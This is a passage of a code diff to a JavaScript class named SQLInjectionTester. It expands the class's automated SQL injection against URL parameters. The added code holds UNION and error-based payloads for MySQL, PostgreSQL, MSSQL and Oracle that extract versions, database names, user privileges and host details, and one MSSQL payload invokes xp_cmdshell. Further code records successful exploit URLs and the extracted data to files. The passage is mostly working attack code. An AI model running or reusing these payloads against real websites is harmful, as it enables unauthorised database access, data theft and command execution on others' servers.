             `CONCAT(0x${Buffer.from('VER:').toString('hex')},@@version,0x${Buffer.from('|DB:').toString('hex')},DATABASE(),0x${Buffer.from('|ALL:').toString('hex')},(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata))`,
+            
+            // Advanced MySQL extraction - with table count
+            `CONCAT(0x${Buffer.from('DB:').toString('hex')},DATABASE(),0x${Buffer.from('|TABLES:').toString('hex')},(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()),0x${Buffer.from('|VER:').toString('hex')},VERSION())`,
+            
+            // Extract database with user privileges
+            `CONCAT(0x${Buffer.from('USER:').toString('hex')},USER(),0x${Buffer.from('|PRIVS:').toString('hex')},(SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT('''',USER(),'''')))`,
+            
+            // Extract with system variables
+            `CONCAT(0x${Buffer.from('VER:').toString('hex')},@@version,0x${Buffer.from('|DATADIR:').toString('hex')},@@datadir,0x${Buffer.from('|HOSTNAME:').toString('hex')},@@hostname)`,
+            
+            // Get databases with sizes
+            `(SELECT GROUP_CONCAT(CONCAT(schema_name,0x3a,ROUND(SUM(data_length+index_length)/1024/1024,2),0x4d42)) FROM information_schema.tables GROUP BY schema_name)`,
+            
             // Just get all databases
             `(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x${Buffer.from(',').toString('hex')}) FROM information_schema.schemata)`,
             // Get non-system databases
             `(SELECT GROUP_CONCAT(schema_name SEPARATOR 0x${Buffer.from(',').toString('hex')}) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','performance_schema','mysql','sys'))`,
+            
+            // PostgreSQL specific
+            `CONCAT(VERSION(),CHR(126),CURRENT_DATABASE())`,
+            `ARRAY_TO_STRING(ARRAY(SELECT datname FROM pg_database),CHR(44))`,
+            
+            // MSSQL specific
+            `CONCAT(@@version,CHAR(126),DB_NAME())`,
+            `(SELECT STRING_AGG(name,CHAR(44)) FROM sys.databases)`,
+            
+            // Oracle specific 
+            `(SELECT LISTAGG(OWNER,CHR(44)) WITHIN GROUP (ORDER BY OWNER) FROM ALL_USERS)`,
+            
             // Basic queries
             `CONCAT(@@version,0x${Buffer.from('~~~').toString('hex')},DATABASE())`,
             `VERSION()`,
@@ -1203,6 +1680,18 @@ export class SQLInjectionTester {
         ];
         
         for (const query of extractionQueries) {
+            // Stop if we already have both name and version
+            if (dbInfo.name && dbInfo.version) {
+                this.logger?.info(`Already have complete DB info (name: ${dbInfo.name}, version: ${dbInfo.version}), stopping UNION extraction`);
+                domainLogger.logDbExtraction('UNION extraction complete - have all required info', {
+                    method: 'union',
+                    query: 'Stopped - already have name and version',
+                    response: JSON.stringify(dbInfo),
+                    success: true
+                });
+                break;
+            }
+            
             try {
                 const testUrlObj = new URL(baseUrlObj);
                 const negativeId = `-${Math.abs(parseInt(originalValue) || 1) + 9999}`;
@@ -1229,6 +1718,17 @@ export class SQLInjectionTester {
                             if (allDbs) {
                                 dbInfo.databases = allDbs.split(',').filter(db => db && db.trim());
                             }
+                            
+                            // Log only relevant response with domain logger
+                            const relevantResponse = this._extractRelevantResponse(responseText, 'DBSTART:');
+                            domainLogger.logDbExtraction('UNION extraction successful (DBSTART markers)', {
+                                method: 'union',
+                                query: query,
+                                response: relevantResponse,
+                                success: true,
+                                extractedInfo: dbInfo
+                            });
+                            
                             this.logger?.info(`Extracted via markers:`, dbInfo);
                             workingPayload = { columnCount, dataColumn: dataColumn + 1, query };
                             break;
@@ -1278,9 +1778,28 @@ export class SQLInjectionTester {
                         dbInfo.type = this._detectDbType(responseText);
                         this.logger?.info(`Found version via pattern:`, dbInfo.version);
                     }
+                    
+                    // Log all UNION attempts with relevant response
+                    const relevantResponse = this._extractRelevantResponse(responseText, 
+                        dbInfo.version || dbInfo.name || 'version\\(\\)|database\\(\\)');
+                    domainLogger.logDbExtraction('UNION extraction attempt', {
+                        method: 'union',
+                        query: query,
+                        response: relevantResponse,
+                        success: !!(dbInfo.version || dbInfo.name),
+                        extractedInfo: dbInfo
+                    });
                 }
             } catch (error) {
                 this.logger?.debug(`UNION extraction failed for query: ${query}`, { error: error.message });
+                
+                // Log failed attempts
+                domainLogger.logDbExtraction('UNION extraction failed', {
+                    method: 'union',
+                    query: query,
+                    response: error.message,
+                    success: false
+                });
             }
         }
         
@@ -1355,15 +1874,87 @@ export class SQLInjectionTester {
         
         return null;
     }
+    
+    /**
+     * Validate that extracted database info is not corrupted/binary data
+     */
+    _isValidDatabaseInfo(dbInfo) {
+        if (!dbInfo) return false;
+        
+        // Check for binary/corrupted data patterns
+        const checkString = (str) => {
+            if (!str || typeof str !== 'string') return true;
+            
+            // Check for excessive non-ASCII characters
+            const nonAsciiCount = (str.match(/[^\x20-\x7E]/g) || []).length;
+            if (nonAsciiCount > str.length * 0.2) return false; // More than 20% non-ASCII
+            
+            // Check for common binary patterns
+            if (str.includes('\x00') || str.includes('\xFF') || str.includes('\xFE')) return false;
+            
+            // Check for PDF/binary file signatures
+            if (str.includes('%PDF') || str.includes('PNG') || str.includes('JFIF')) return false;
+            
+            // Check if it's mostly question marks or corrupted
+            const questionMarkCount = (str.match(/\?/g) || []).length;
+            if (questionMarkCount > str.length * 0.3) return false; // More than 30% question marks
+            
+            // Check minimum valid length
+            if (str.length < 2 || str.length > 200) return false;
+            
+            return true;
+        };
+        
+        // Validate each field
+        if (!checkString(dbInfo.type)) return false;
+        if (!checkString(dbInfo.version)) return false;
+        if (!checkString(dbInfo.name)) return false;
+        
+        // Additional validation for version numbers
+        if (dbInfo.version) {
+            // Version should match common database version patterns
+            // e.g., 5.7.32, 8.0.21-log, 10.5.8-MariaDB, 14.2, etc.
+            const validVersionPattern = /^(\d{1,2}\.){1,3}\d{1,3}([-\w]*)?$/;
+            if (!validVersionPattern.test(dbInfo.version)) return false;
+            
+            // Check for unrealistic version numbers
+            const majorVersion = parseInt(dbInfo.version.split('.')[0]);
+            if (majorVersion > 20) return false; // Most DB versions are < 20
+        }
+        
+        return true;
+    }
 
     /**
      * Attempt error-based extraction
      */
     async _attemptErrorBasedExtraction(baseUrlObj, param, dbInfo) {
         const originalValue = baseUrlObj.searchParams.get(param);
+        const domainLogger = await getDomainLogger(baseUrlObj.toString());
         
+        // Extended error-based payloads for different databases
         const errorPayloads = [
+            // MySQL/MariaDB
             `' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))-- -`,
+            `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), 0x7e))-- -`,
+            `' AND UPDATEXML(1, CONCAT(0x7e, VERSION(), 0x7e), 1)-- -`,
+            `' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e, VERSION(), 0x7e))x))-- -`,
+            `' AND GTID_SUBSET(CONCAT(0x7e, VERSION(), 0x7e), 1)-- -`,
+            `' AND JSON_KEYS((SELECT CONCAT(0x7e, VERSION(), 0x7e)))-- -`,
+            `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
+            
+            // PostgreSQL  
+            `' AND 1=CAST((SELECT VERSION()) AS INT)-- -`,
+            `' AND 1=CONVERT(INT, (SELECT @@version))-- -`,
+            
+            // Oracle
+            `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))-- -`,
+            `' AND 1=CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))-- -`,
+            
+            // MSSQL
+            `' AND 1=CONVERT(INT, @@version)-- -`,
+            `' AND 1=CAST(@@version AS INT)-- -`,
+            `'; DECLARE @x NVARCHAR(4000); SET @x=CAST(@@version AS NVARCHAR(4000)); EXEC('xp_cmdshell ''echo '+@x+'''')-- -`,
             `' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))-- -`,
             `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -`,
             `' AND 1=CONVERT(int,@@version)-- -`,
@@ -1371,22 +1962,65 @@ export class SQLInjectionTester {
         ];
 
         for (const payload of errorPayloads) {
+            // Stop if we already have both name and version
+            if (dbInfo.name && dbInfo.version) {
+                this.logger?.info(`Already have complete DB info (name: ${dbInfo.name}, version: ${dbInfo.version}), stopping extraction`);
+                domainLogger.logDbExtraction('Extraction complete - have all required info', {
+                    method: 'error_based',
+                    query: 'Stopped - already have name and version',
+                    response: JSON.stringify(dbInfo),
+                    success: true
+                });
+                return;
+            }
+            
             try {
                 const testUrlObj = new URL(baseUrlObj);
                 testUrlObj.searchParams.set(param, originalValue + payload);
                 
                 const response = await this._makeRequest(testUrlObj.toString());
                 
-                if (response.status === 200) {
+                if (response.status === 200 || response.status === 500) {
                     const extracted = this._parseDbInfoFromText(response.data);
-                    if (extracted.type || extracted.version || extracted.name) {
-                        Object.assign(dbInfo, extracted);
-                        this.logger?.info(`Successfully extracted DB info via error-based`, extracted);
-                        return;
+                    if (extracted && (extracted.type || extracted.version || extracted.name)) {
+                        // Validate extracted data is not binary/corrupted
+                        if (this._isValidDatabaseInfo(extracted)) {
+                            Object.assign(dbInfo, extracted);
+                            this.logger?.info(`Successfully extracted DB info via error-based`, extracted);
+                            
+                            // Log extraction details using domain logger with relevant response
+                            const relevantResponse = this._extractRelevantResponse(response.data, dbInfo.version || dbInfo.name || 'error');
+                            domainLogger.logDbExtraction('Error-based extraction successful', {
+                                method: 'error_based',
+                                query: payload,
+                                response: relevantResponse,
+                                success: true,
+                                extractedInfo: dbInfo
+                            });
+                        } else {
+                            this.logger?.debug(`Extracted data appears corrupted, skipping`);
+                        }
+                    } else {
+                        // Log attempt with relevant response even if no data extracted
+                        const relevantResponse = this._extractRelevantResponse(response.data, 'error');
+                        domainLogger.logDbExtraction('Error-based extraction attempt', {
+                            method: 'error_based',
+                            query: payload,
+                            response: relevantResponse,
+                            success: false
+                        });
                     }
                 }
             } catch (error) {
                 this.logger?.debug(`Error-based extraction failed for payload: ${payload}`, { error: error.message });
+                
+                // Log failed attempts only for debugging
+                domainLogger.logDbExtraction('Error-based extraction attempt failed', {
+                    method: 'error_based',
+                    query: payload,
+                    response: error.message,
+                    success: false
+                });
             }
         }
     }
@@ -1441,5 +2075,68 @@ export class SQLInjectionTester {
         } catch (error) {
             this.logger?.error('Failed to save vulnerable URL', { url, error: error.message });
         }
+    }
+    
+    /* Save detailed vulnerability information */
+    async _saveVulnerabilityDetails(details) {
+        try {
+            const detailLine = JSON.stringify({
+                timestamp: details.timestamp,
+                url: details.url,
+                exploitUrl: details.exploitUrl,
+                parameter: details.parameter,
+                type: details.type,
+                payload: details.payload,
+                database: {
+                    type: details.database?.type || 'Unknown',
+                    version: details.database?.version || 'Unknown',
+                    name: details.database?.name || 'Unknown',
+                    databases: details.database?.databases || []
+                },
+                confirmed: details.confirmed
+            }) + '\n';
+            
+            await appendToFile(this.config.detailsFile, detailLine, this.logger);
+            this.logger?.info('Saved vulnerability details', { 
+                file: this.config.detailsFile,
+                confirmed: details.confirmed 
+            });
+        } catch (error) {
+            this.logger?.error('Failed to save vulnerability details', { error: error.message });
+        }
+    }
+
+    /**
+     * Extract only relevant parts from response (max 5 lines around detected content)
+     */
+    _extractRelevantResponse(responseText, keyword) {
+        if (!responseText || !keyword) return '';
+        
+        const lines = responseText.split('\n');
+        const relevantLines = [];
+        let foundIndex = -1;
+        
+        // Find line containing keyword
+        for (let i = 0; i < lines.length; i++) {
+            if (lines[i].toLowerCase().includes(keyword.toLowerCase())) {
+                foundIndex = i;
+                break;
+            }
+        }
+        
+        if (foundIndex === -1) {
+            // If keyword not found, return first 5 lines with content
+            return lines.filter(line => line.trim()).slice(0, 5).join('\n').substring(0, 500);
+        }
+        
+        // Extract 2 lines before and 2 lines after the found line (total 5 lines)
+        const start = Math.max(0, foundIndex - 2);
+        const end = Math.min(lines.length - 1, foundIndex + 2);
+        
+        for (let i = start; i <= end; i++) {
+            relevantLines.push(lines[i]);
+        }
+        
+        return relevantLines.join('\n').substring(0, 500);
     }
 }
